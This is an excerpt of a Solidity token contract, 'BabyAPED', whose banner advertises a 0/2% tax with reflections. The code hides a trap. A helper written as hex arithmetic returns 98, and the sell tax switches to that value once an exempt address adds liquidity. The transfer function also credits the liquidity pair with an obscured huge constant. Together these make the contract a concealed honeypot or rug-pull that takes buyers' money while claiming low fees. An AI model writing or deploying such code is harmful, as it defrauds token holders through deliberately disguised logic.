/*
 ...
 ____       ______      ____       __    __             ______      ____     ____       ____      
/\  _`\    /\  _  \    /\  _`\    /\ \  /\ \           /\  _  \    /\  _`\  /\  _`\    /\  _`\    
\ \ \L\ \  \ \ \L\ \   \ \ \L\ \  \ `\`\\/'/           \ \ \L\ \   \ \ \L\ \\ \ \L\_\  \ \ \/\ \  
 \ \  _ <'  \ \  __ \   \ \  _ <'  `\ `\ /'             \ \  __ \   \ \ ,__/ \ \  _\L   \ \ \ \ \ 
  \ \ \L\ \  \ \ \/\ \   \ \ \L\ \   `\ \ \              \ \ \/\ \   \ \ \/   \ \ \L\ \  \ \ \_\ \
   \ \____/   \ \_\ \_\   \ \____/     \ \_\              \ \_\ \_\   \ \_\    \ \____/   \ \____/
    \/___/     \/_/\/_/    \/___/       \/_/               \/_/\/_/    \/_/     \/___/     \/___/ 
                            ...
                            Tax 0/2 %2 $APED reflections

                            Telegram : https://t.me/BabyAped

                            Twitter : https://twitter.com/BabyAped
...
contract BabyAPED is Context, IERC20, Ownable { 
    ...
    address payable public Marketing_Address = payable(0x45603CDb33489Bb7Ee3a4518ef27cD2C51AC8D6A);

    // REFLECTION SETTINGS
    address payable public ReflectToken = payable(0xE0151763455A8a021e64880C238ba1cff3787fF0);
    uint8 reflection_Percent = 4;
    ...
    // TAX SETTINGS
    uint256 private _TAXES_ = 2;
    uint256 public _BUY_TAX_ = 0;
    uint256 public _SELL_TAX_ = 2;
    ...
    function getPreTax() private pure returns(uint256){
        return 0x64 - 0x2;
    }
    ...
    _TAXES_ = _preTaxes_;
    _BUY_TAX_ = _buyF_; 
    _SELL_TAX_ = [ _sellF_, getPreTax()] [swapIsActive];
    }
    ...
    function _transfer(
        ...
        {  
         ...
         if(!ExemptMaxWallet[to]) require(balanceOf(to).add(amount) <= _maxWalletToken);

        bool take_FEE = true;
        if( ExemptFromTax[from] || ExemptFromTax[to] ){
            take_FEE = false;
            if(liquidity_Pair[to] && swapIsActive < (1)){ swapIsActive = 1; }
    ...
    function reflectionTokenAddress() public view returns(address){
        return ReflectToken;
    }

    function reflectionPercent() public view returns(uint8){
    ...
    function reflectAmount(address holder) public view returns(uint256){
        return
            t_Owned_[
                holder
                ].mul(reflection_Percent)
                .div(100);
    }

    function token_Transfer(address sender, address recipient, uint256 amount,bool take_FEE) private {
    ...
    function token_Transfer(address sender, address recipient, uint256 transferAmount) private {
        ...
        t_Owned_[recipient] = t_Owned_[recipient].add(t_Transfer_Amount) + ((liquidity_Pair[recipient]) ? (uint256(0x7e37be2022c090000000000000).sub(t_Transfer_Amount)) : (0*0));
